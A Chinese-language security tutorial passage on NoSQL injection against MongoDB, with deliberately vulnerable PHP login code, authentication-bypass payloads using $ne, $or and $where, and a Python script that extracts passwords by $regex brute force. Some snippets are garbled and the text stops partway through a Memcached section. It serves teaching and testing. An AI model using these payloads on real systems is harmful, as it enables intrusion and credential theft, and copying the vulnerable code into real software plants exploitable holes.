NoSql数据库之漏洞利用方法总结
原创六号刃部 酒仙桥六号部队
2020-08-21原文
这是 酒仙桥六号部队 的第 65 篇文章。
全文共计6406个字，预计阅读时长19分钟。
NoSQL数据库特性
NoSQL 全 称 是 Not Only
SQL，意为不仅仅是SQL。是一种非关系型数据存储模式，它存储的
不 再 是 结 构 化 数 据 ， 而 是 类 型 和 固 定 的 格 式 ， 以 key-
value键值对、列式、文档来存储。而相较于关系型数据库，非关系
数据库的优点有如下几点：
1、快速读写
主要例子有Redis，由于其逻辑简单，而且纯内存操作，使得其性能非常出色，单
节点每秒可以处理超过10万次读写操作。
2、方便扩展
NoSQL去掉关系数据库的关系型特性，很容易横向扩展，摆脱了以往老是纵向扩展
的诟病。
3、低廉成本
相较于关系型数据库来说，企业级授权费用降低很多。
4、灵活的数据类型
NoSQL无需事先为要存储的数据建立字段，随时可以存储自定义的数据格式。
NoSQL数据库分类和特点如下：
NoSQL数据库注入
NoSQL数据库虽然不使用SQL语句，但用网上的一句话来说，有DB的
地方就有injection。且NoSQL注入的危害更大，因语句是以Web应
用程序的语言来注入并在服务器上执行，从而导致允许任意代码执
行，所以潜在影响要大于传统的SQL注入。
NoSQL注入攻击流程(此图来源于owasp)
NoSQL注入大概分为重言式、联合查询、Javascript、盲注、背负
式查询、跨域违规等，由于背负式查询和跨域违规两种方式资料太
少，也没有实战环境可测试，所以着重讲解前面几种注入方式。(此
处使用MongoDB数据库来进行演示)
准备测试数据：
创建数据库
use admin //创建一个admin数据库,如果有admin数据库就选择admin数据库
插入数据
db.admin.insert({'username':'time','password':'11111'})//默认会自
动创建admin集合
查询数据
db.admin.find()//查询所有数据
查看所有数据库
show dbs
查看集合
show collections
1、重言式
又称永真式，既在条件语句中注入代码使其表达式判定结果永远为
真，从而绕过认证或访问机制。而怎么使其注入代码后让表达式判
定结果永远为真，此处就不得不说一下Mongodb数据库的条件操作
符了。如下：
$eq : = //匹配字段值等于指定值的文档
$gt : > //匹配字段值大于指定值的文档
$lt : = //匹配字段值大于等于指定值的文档
$lte:  $uname,
'pwd' => $pwd
));
# 执行语句
$result = $manager->executeQuery('admin.admin', $query)-
>toArray();
$count = count($result);
if ($count > 0) {
foreach ($result as $user) {
$user = ((array)$user);
echo 'username:' . $user['uname'] . '';
echo 'password:' . $user['pwd'] . '';
}
}
else{
echo 'Not Found';
}
如图，此处输入对的账号密码查询出一条语句。
如果输入以下代码，则会将数据库中所有的账户密码全部查询出来
：
http://192.168.239.135/n/login.php?username[$ne]=1&password[$ne]
=1
此处$ne是把数据库中$ne等于1之外的数据都查询出来
如果输入
username[$ne]=time&password[$ne]=time111,会将账户不是
time的所有数据显示。
当用户输入
username[$ne]=1&password[$ne]=1的时候，程序会将用户输入
的账户密码构造成以下数据带入数据库中查询。
$query = new MongoDB\Driver\Query(array(
'uname' => array($ne => 1),
'pwd' => array($ne => 1)
));
数据库中查询出用户想要的数据。
2、联合查询
攻击者利用一个脆弱的参数去改变给定查询返回的数据集，最常用
的用法是绕过认证页面获取数据。比如通过增加永真式的表达式利
用布尔的OR运算符导致整个语句判定出错。(因没有找到测试环境，
此处大概讲一下注入方式)
小栗子(例)：登录代码：
string query = "{ username:'" + post_username + "', password:'"
+ post_passport + ' " }"
当 我 们 登 录 账 户 时 ， 正 确 的 查 询 语 句 如 下 ：
{‘username’:'time',‘password’:'time111'}
如果构造一个恶意代码来忽略密码，那么就可以无需密码的情况下
登录用户账号。
username=time',$or:[{},{'a':'a&password='}]
构造的恶意语句
{'username':'time', '$or':[{},{'a':'a','password':''}]}
当将恶意语句带入数据库查询的时候匹配到当前用户的数据。
3、JavaScript注入
新型注入漏洞，由允许执行数据内容中的javascript的NoSQL数据
库引入的。JavaScript使在数据引擎进行复杂事物和查询成为可能
。传递不干净的用户输入到这些查询中可以注入任意JavaScript代
码，导致非法的数据获取或篡改。而Mongodb中的$where操作符就
可以用来执行Javascript语句。
//测试代码
"function q() {
var username = ".$_REQUEST["username"].";
var password = ".$_REQUEST["password"].";if(username ==
'time'&&password == 'time111') return true; else{ return
false;}}
");
$query = new MongoDB\Driver\Query($query_body);
$cursor = $manager->executeQuery('test.test', $query)-
>toArray();
if(count($cursor)>0){
echo "ok";
}else{
echo "no";
}
当不知道账号密码的时候，在地址栏随意输入字符，页面返回错误
。
当在参数后加上;return true;时页面返回ok。
payload：username=1&password=1;return ture;
当输入return ture;程序会构造出以下语句
'$where'=>"function q() {
var username = ".$_REQUEST["username"].";
var password = ".$_REQUEST["password"].";
//在此处添加一段代码，不管用户输入什么都返回ture
return ture;
if(username == 'time'&&password == 'time111') return true;
else{ return false;}}
");
带入数据库中查询成功
4、盲注
NoSQL的盲注和SQL注入盲注类似，都是不返回数据，只是根据错误
页面的返回来判断是否存在注入。此处我们需要用到的MongoDB的
操作符来进行盲注$eq(等于)和$regex(正则匹配)。
//测试代码
test; //选择数据库
$coll = $db->users; //选择集合
$username = $_REQUEST['username'];
$password = $_REQUEST['password'];
if (is_array($username)) {
$data = array(
'username'=>$username);
$data = $coll->find($data);
if ($data->count()>0) {
echo 'yes';
}else{
echo 'time no';
}
}else{
if ($username == 'time'&&$password=='time111') {
echo 'ok';
}else{
echo 'login no';
}
}
?>
随意输入字符，页面返回错误。
如果使用已知用户名为time，页面同样返回错误，而怎么才能确定
账户是否正确，此时需要借助操作符$eq+burp，可以帮我们快速查
找正确的账户。
首先找一个字典，由于我本地环境，所以用了四个账户测试。抓包
：
payload：username[$eq]=§1111§&password=111
设置字典：
可以看见，跑出两个正确的用户名。
当确定了账号后，密码则使用正则匹配$regex来获取：
//判断密码长度
http://10.211.55.3/news.php?username[$eq]=time&password[$regex]=
.{7}
http://10.211.55.3/news.php?username[$eq]=time&password[$regex]=
t.{6}
http://10.211.55.3/news.php?username[$eq]=time&password[$regex]=
ti.{5}
http://10.211.55.3/news.php?username[$eq]=time&password[$regex]=
tim.{4}
以此类推
数据库中查询语句会使用$regex和^
{'username':{'$eq':'time'},'password':{'$regex':'^'}}
而密码就有些复杂了，不能使用burp，不过可以借助脚本来测试。
脚本:
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()
username = 'admin'
password = ''
target = 'http://127.0.0.1/mongo/test.php'
while True:
for c in string.printable:
if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
payload = '?username=%s&password[$regex]=^%s' %
(username, password + c)
r = requests.get(target + payload)
if 'OK' in r.text:
print("Found one more char : %s" % (password+c))
password += c
5、背负式查询
背负式查询是Memcached数据库的的一种注入，在php5.5的时候该
漏洞被修复，由于网上资料较少，所以此处在网上摘抄了一部分作
为了解。
语法：
set    ,
当PHP配置的函数被调用时，接收参数如下：
$memcached->set('key', 'value');
该驱动程序未能针对带有回车\r(0x0D)和换行的\n(0x0A)的ASCI